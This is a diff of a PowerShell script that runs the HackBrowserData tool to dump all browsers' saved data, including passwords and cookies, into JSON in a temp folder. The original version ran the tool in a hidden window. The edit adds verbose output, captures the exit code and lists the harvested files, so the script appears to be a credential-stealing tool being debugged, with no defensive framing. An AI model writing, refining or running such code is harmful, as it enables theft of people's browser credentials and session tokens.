@@ -50,13 +50,14 @@ $zipPath = "$tempDir\hbd.zip"
     # Run HackBrowserData with elevated privileges
     $exePath = "$tempDir\hack-browser-data.exe"
     if(Test-Path $exePath) {
-        # Try to run with admin privileges
-        Start-Process -FilePath $exePath -ArgumentList "-b all -f json --dir $tempDir" -WindowStyle Hidden -Wait
+        # Try to run with admin privileges and capture output
+        $process = Start-Process -FilePath $exePath -ArgumentList "-b all -f json --dir $tempDir -vv" -WindowStyle Normal -Wait -PassThru
+        $exitCode = $process.ExitCode
         Start-Sleep -Seconds 10
         
         # Debug: List all files in temp directory
         $allFiles = Get-ChildItem -Path $tempDir -Recurse
-        $debugInfo = "Files found: " + ($allFiles.Count) + "`n"
+        $debugInfo = "Files found: " + ($allFiles.Count) + " Exit code: $exitCode`n"
         foreach($file in $allFiles) {
             $debugInfo += $file.Name + "`n"
         }
